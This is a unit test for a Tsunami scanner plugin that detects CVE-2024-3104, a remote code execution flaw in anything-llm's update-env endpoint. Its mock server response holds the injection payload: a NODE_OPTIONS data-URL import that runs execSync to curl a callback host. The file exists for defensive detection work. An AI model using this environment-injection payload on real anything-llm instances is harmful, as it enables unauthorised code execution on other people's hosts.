/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.cves.cve20243104;

import static com.google.common.truth.Truth.assertThat;
import static com.google.common.truth.extensions.proto.ProtoTruth.assertThat;
import static com.google.tsunami.common.data.NetworkEndpointUtils.forHostnameAndPort;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.collect.ImmutableList;
import com.google.common.io.Resources;
import com.google.inject.Guice;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.net.http.HttpClientModule;
import com.google.tsunami.common.time.testing.FakeUtcClock;
import com.google.tsunami.common.time.testing.FakeUtcClockModule;
import com.google.tsunami.plugin.payload.testing.FakePayloadGeneratorModule;
import com.google.tsunami.plugin.payload.testing.PayloadTestHelper;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Instant;
import javax.inject.Inject;
import okhttp3.mockwebserver.Dispatcher;
import okhttp3.mockwebserver.MockResponse;
import okhttp3.mockwebserver.MockWebServer;
import okhttp3.mockwebserver.RecordedRequest;
import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.junit.runners.JUnit4;

/** Unit tests for {@link Cve20243104VulnDetector}. */
@RunWith(JUnit4.class)
public class Cve20243104VulnDetectorTest {
  private final FakeUtcClock fakeUtcClock =
      FakeUtcClock.create().setNow(Instant.parse("2022-05-23T00:00:00.00Z"));
  private MockWebServer mockWebServer;
  private MockWebServer mockCallbackServer;
  private NetworkService targetNetworkService;
  private TargetInfo targetInfo;
  private String mainPage;

  @Inject private Cve20243104VulnDetector detector;

  @Before
  public void setUp() throws IOException {
    mockWebServer = new MockWebServer();
    mockCallbackServer = new MockWebServer();
    mockCallbackServer.start();
    mainPage = Resources.toString(Resources.getResource(this.getClass(), "mainpage.html"), UTF_8);
    Guice.createInjector(
            new FakeUtcClockModule(fakeUtcClock),
            new HttpClientModule.Builder().build(),
            FakePayloadGeneratorModule.builder().setCallbackServer(mockCallbackServer).build(),
            new Cve20243104DetectorBootstrapModule())
        .injectMembers(this);
  }

  @After
  public void tearDown() throws IOException {
    mockWebServer.shutdown();
    mockCallbackServer.shutdown();
  }

  @Test
  public void detect_whenVulnerable_returnsVulnerability() throws IOException {
    startMockWebServer();
    mockCallbackServer.enqueue(PayloadTestHelper.generateMockSuccessfulCallbackResponse());
    DetectionReportList detectionReports =
        detector.detect(targetInfo, ImmutableList.of(targetNetworkService));

    assertThat(detectionReports.getDetectionReportsList())
        .containsExactly(
            DetectionReport.newBuilder()
                .setTargetInfo(targetInfo)
                .setNetworkService(targetNetworkService)
                .setDetectionTimestamp(
                    Timestamps.fromMillis(Instant.now(fakeUtcClock).toEpochMilli()))
                .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
                .setVulnerability(
                    Vulnerability.newBuilder()
                        .setMainId(
                            VulnerabilityId.newBuilder()
                                .setPublisher("TSUNAMI_COMMUNITY")
                                .setValue("CVE_2024_3104"))
                        .addRelatedId(
                            VulnerabilityId.newBuilder()
                                .setPublisher("CVE")
                                .setValue("CVE-2024-3104"))
                        .setSeverity(Severity.CRITICAL)
                        .setTitle("CVE-2024-3104 anything-llm RCE")
                        .setRecommendation(
                            "You can upgrade your anything-llm instances to a version whose commit"
                                + " ID is bfedfebfab032e6f4d5a369c8a2f947c5d0c5286 or later.")
                        .setDescription(
                            "A remote code execution vulnerability exists in"
                                + " mintplex-labs/anything-llm due to improper handling of"
                                + " environment variables. Attackers can exploit this vulnerability"
                                + " by injecting arbitrary environment variables via the POST"
                                + " /api/system/update-env endpoint, which allows for the execution"
                                + " of arbitrary code on the host running anything-llm.Successful"
                                + " exploitation could lead to code execution on the host, enabling"
                                + " attackers to read and modify data accessible to the user"
                                + " running the service, potentially leading to a denial of"
                                + " service."))
                .build());
    assertThat(mockWebServer.getRequestCount()).isEqualTo(4);
    assertThat(mockCallbackServer.getRequestCount()).isEqualTo(1);
  }

  @Test
  public void detect_ifNotVulnerable_doesNotReportVuln() throws IOException {
    startMockWebServer();
    DetectionReportList detectionReports =
        detector.detect(targetInfo, ImmutableList.of(targetNetworkService));
    assertThat(detectionReports.getDetectionReportsList()).isEmpty();
    assertThat(mockWebServer.getRequestCount()).isEqualTo(4);
  }

  private void startMockWebServer() throws IOException {
    final Dispatcher dispatcher =
        new Dispatcher() {
          // Responses don't change in a fixed instance.
          @Override
          public MockResponse dispatch(RecordedRequest request) {
            switch (request.getPath()) {
              case "/":
                return new MockResponse().setResponseCode(200).setBody(mainPage);
              case "/api/env-dump":
                return new MockResponse().setResponseCode(200).setBody("OK");
              case "/api/migrate":
                return new MockResponse().setResponseCode(200).setBody("OK");
              case "/api/system/update-env":
                return new MockResponse()
                    .setResponseCode(200)
                    .setBody(
                        "{\"newValues\":{\"LocalAiBasePath\":\"http://example.com/v1'\\n"
                            + "NODE_OPTIONS='--import=\\\"data:text/javascript,import exec from"
                            + " \\\\\\\"node:child_process\\\\\\\";exec.execSync(\\\\\\\"curl"
                            + " 21dca0b8fa6792683a37c5823b6074c774d169e453dbeacd73c0b612.localhost:35953\\\\\\\")\\\"\"},\"error\":false}");
              default:
                return new MockResponse().setResponseCode(200).setBody(mainPage);
            }
          }
        };
    mockWebServer.setDispatcher(dispatcher);
    mockWebServer.start();
    mockWebServer.url("/");
    targetNetworkService =
        NetworkService.newBuilder()
            .setNetworkEndpoint(
                forHostnameAndPort(mockWebServer.getHostName(), mockWebServer.getPort()))
            .addSupportedHttpMethods("POST")
            .addSupportedHttpMethods("GET")
            .build();
    targetInfo =
        TargetInfo.newBuilder()
            .addNetworkEndpoints(targetNetworkService.getNetworkEndpoint())
            .build();
  }
}
